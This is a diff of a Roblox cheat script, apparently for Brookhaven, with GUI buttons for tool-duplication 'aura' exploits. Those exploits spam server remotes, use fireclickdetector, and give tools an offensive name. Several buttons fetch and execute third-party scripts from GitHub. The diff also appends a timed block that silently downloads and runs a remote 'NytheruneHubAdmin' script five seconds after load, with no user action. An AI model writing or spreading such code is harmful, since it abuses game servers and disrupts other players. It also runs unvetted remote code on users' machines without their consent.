-  Vector3.new(-40, 0, -75),
-  Vector3.new(-50, 0, -75),
-  Vector3.new(-60, 0, -75),
-
-
-     }
-      for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-          if tool:IsA("Tool") then
-              tool.Parent = game.Players.LocalPlayer.Character
-              local gripPosIndex = math.min(i, #TablaGripPos)
-              local gripPos = TablaGripPos[gripPosIndex]
-              
-              if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                  tool.GripPos = gripPos
-              else
-              end
-          end
-      end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Smoke Aura",
-    Callback = function()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Warn!",
-            Text = "Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.",
-            Button1 = "I understand",
-            Duration = 5
-        })
-        local args = {
-            [1] = "ClearAllTools"
-        }
-        cleartoolremote:FireServer(unpack(args))
-        if game:GetService("Workspace"):FindFirstChild("Camera") then
-            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-        end
-        wait(0.3)
-        for i = 1, 124 do
-            local args = {
-                [1] = "PickingTools",
-                [2] = "FireHose"
-            }
-            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
-            local args = {
-                [1] = "FireHose",
-                [2] = "DestroyFireHose"
-            }
-            game:GetService("Players").LocalPlayer.Backpack.FireHose.ToolSound:FireServer(unpack(args))
-        end
-        local player = game.Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            humanoid.Health = 0
-        end
-        wait(8)
-        local TablaGripPos = {
-            Vector3.new(0, 0, 0), Vector3.new(10, 0, 0), Vector3.new(20, 0, 0), Vector3.new(30, 0, 0),
-            Vector3.new(40, 0, 0), Vector3.new(50, 0, 0), Vector3.new(60, 0, 0), Vector3.new(-0, 0, 0),
-            Vector3.new(-10, 0, 0), Vector3.new(-20, 0, 0), Vector3.new(-30, 0, 0), Vector3.new(-40, 0, 0),
-            Vector3.new(-50, 0, 0), Vector3.new(-60, 0, 0), Vector3.new(0, 0, 30), Vector3.new(10, 0, 30),
-            Vector3.new(20, 0, 30), Vector3.new(30, 0, 30), Vector3.new(40, 0, 30), Vector3.new(50, 0, 30),
-            Vector3.new(60, 0, 30), Vector3.new(-0, 0, 30), Vector3.new(-10, 0, 30), Vector3.new(-20, 0, 30),
-            Vector3.new(-30, 0, 30), Vector3.new(-40, 0, 30), Vector3.new(-50, 0, 30), Vector3.new(-60, 0, 30),
-            Vector3.new(0, 0, 45), Vector3.new(10, 0, 45), Vector3.new(20, 0, 45), Vector3.new(30, 0, 45),
-            Vector3.new(40, 0, 45), Vector3.new(50, 0, 45), Vector3.new(60, 0, 45), Vector3.new(-0, 0, 45),
-            Vector3.new(-10, 0, 45), Vector3.new(-20, 0, 45), Vector3.new(-30, 0, 45), Vector3.new(-40, 0, 45),
-            Vector3.new(-50, 0, 45), Vector3.new(-60, 0, 45), Vector3.new(0, 0, 15), Vector3.new(10, 0, 15),
-            Vector3.new(20, 0, 15), Vector3.new(30, 0, 15), Vector3.new(40, 0, 15), Vector3.new(50, 0, 15),
-            Vector3.new(60, 0, 15), Vector3.new(-0, 0, 15), Vector3.new(-10, 0, 15), Vector3.new(-20, 0, 15),
-            Vector3.new(-30, 0, 15), Vector3.new(-40, 0, 15), Vector3.new(-50, 0, 15), Vector3.new(-60, 0, 15),
-            Vector3.new(0, 0, -15), Vector3.new(10, 0, -15), Vector3.new(20, 0, -15), Vector3.new(30, 0, -15),
-            Vector3.new(40, 0, -15), Vector3.new(50, 0, -15), Vector3.new(60, 0, -15), Vector3.new(-0, 0, -15),
-            Vector3.new(-10, 0, -15), Vector3.new(-20, 0, -15), Vector3.new(-30, 0, -15), Vector3.new(-40, 0, -15),
-            Vector3.new(-50, 0, -15), Vector3.new(-60, 0, -15), Vector3.new(0, 0, -30), Vector3.new(10, 0, -30),
-            Vector3.new(20, 0, -30), Vector3.new(30, 0, -30), Vector3.new(40, 0, -30), Vector3.new(50, 0, -30),
-            Vector3.new(60, 0, -30), Vector3.new(-0, 0, -30), Vector3.new(-10, 0, -30), Vector3.new(-20, 0, -30),
-            Vector3.new(-30, 0, -30), Vector3.new(-40, 0, -30), Vector3.new(-50, 0, -30), Vector3.new(-60, 0, -30),
-            Vector3.new(0, 0, -30), Vector3.new(10, 0, -45), Vector3.new(20, 0, -45), Vector3.new(30, 0, -45),
-            Vector3.new(40, 0, -45), Vector3.new(50, 0, -45), Vector3.new(60, 0, -45), Vector3.new(-0, 0, -45),
-            Vector3.new(-10, 0, -45), Vector3.new(-20, 0, -45), Vector3.new(-30, 0, -45), Vector3.new(-40, 0, -45),
-            Vector3.new(-50, 0, -45), Vector3.new(-60, 0, -45), Vector3.new(10, 0, -60), Vector3.new(20, 0, -60),
-            Vector3.new(30, 0, -60), Vector3.new(40, 0, -60), Vector3.new(50, 0, -60), Vector3.new(60, 0, -60),
-            Vector3.new(-0, 0, -60), Vector3.new(-10, 0, -60), Vector3.new(-20, 0, -60), Vector3.new(-30, 0, -60),
-            Vector3.new(-40, 0, -60), Vector3.new(-50, 0, -60), Vector3.new(-60, 0, -60), Vector3.new(10, 0, -75),
-            Vector3.new(20, 0, -75), Vector3.new(30, 0, -75), Vector3.new(40, 0, -75), Vector3.new(50, 0, -75),
-            Vector3.new(60, 0, -75), Vector3.new(-0, 0, -75), Vector3.new(-10, 0, -75), Vector3.new(-20, 0, -75),
-            Vector3.new(-30, 0, -75), Vector3.new(-40, 0, -75), Vector3.new(-50, 0, -75), Vector3.new(-60, 0, -75)
-        }
-        for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-            if tool:IsA("Tool") then
-                tool.Parent = game.Players.LocalPlayer.Character
-                local gripPosIndex = math.min(i, #TablaGripPos)
-                local gripPos = TablaGripPos[gripPosIndex]
-                if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                    tool.GripPos = gripPos
-                else
-                end
-            end
-        end
-    end
-})
-
-Section = ToolsTab:AddSection({
-    Name = "Super Aura Grip"
-})
-
-ToolsTab:AddButton({
-    Name = "Super Aura Smoke",
-    Description = "The aura will appear if you hold the screen, then the smoke will appear",
-    Callback = function()
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
-local fireXPath = workspace:FindFirstChild("WorkspaceCom") 
-    and workspace.WorkspaceCom:FindFirstChild("001_GiveTools") 
-    and workspace.WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")
-
-local nametools = "crystal nazi lel"
-local oldcframe = LocalPlayer.Character.HumanoidRootPart.CFrame
-local attempts = 57
-local delayBetweenClicks = 0.3
-
-local gripBase = CFrame.new(-0.290086746, 0.0755810738, -0.0109872818, 0.0439560413, 0.509705901, -0.859225094, -0.0591450632, -0.857220173, -0.511542261, -0.997281134, 0.0733042806, -0.00753343105)
-local handleOffset = CFrame.new(2, 1, -3)
-
-local rotSpeed = math.rad(3600)
-
-local function clickTool(object)
-    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
-    if clickDetector then
-        fireclickdetector(clickDetector)
-    end
-end
-
-local function setupTool(tool)
-    tool.Grip = gripBase
-    tool.Name = nametools
-
-    local handle = tool:FindFirstChild("Handle")
-    if handle then
-        local weld = handle:FindFirstChildWhichIsA("Motor6D")
-        if weld then weld:Destroy() end
-
-        RunService.RenderStepped:Connect(function()
-            if handle.Parent == LocalPlayer.Character then
-                handle.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * handleOffset
-            end
-        end)
-    end
-
-    tool.Parent = LocalPlayer.Character
-end
-
-RunService.RenderStepped:Connect(function(deltaTime)
-    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if hrp then
-        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, rotSpeed * deltaTime, 0)
-    end
-end)
-
-local function dupeToolsFireX(fireXPath)
-    if not fireXPath then
-        return
-    end
-
-    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not hrp then return end
-
-    hrp.CFrame = fireXPath.CFrame
-
-    for i = 1, attempts do
-        clickTool(fireXPath)
-        task.wait(delayBetweenClicks)
-
-        local tool = LocalPlayer.Backpack:FindFirstChild("FireX")
-        if tool then
-            setupTool(tool)
-        end
-    end
-
-    hrp.CFrame = oldcframe
-end
-
-dupeToolsFireX(fireXPath)
-    end
-})
-
-Section = ToolsTab:AddSection({
-    Name = "Others"
-})
-
-ToolsTab:AddButton({
-    Name = "Coming soon...",
-    Callback = function()
-    end
-})
+                                                                                                                        
+                                                    
 
 local AntiTab = Window:MakeTab({"Protections", "shield"})
 
@@ -10878,13 +8683,6 @@ ScriptsTab:AddButton({
 })
 
 ScriptsTab:AddButton({
-    Name = "Nytherune Hub",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/spacecomm/refs/heads/main/nytheruneplus"))()
-    end
-})
-
-ScriptsTab:AddButton({
     Name = "Cartola Hub",
     Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Davi999z/Cartola-Hub/refs/heads/main/Brookhaven",true))()
@@ -10964,3 +8762,8 @@ UniversalTab:AddButton({
     end
 
 })
+
+
+task.delay(5, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/ScriptAdminNew/refs/heads/main/NytheruneHubAdmin"))()
+end)
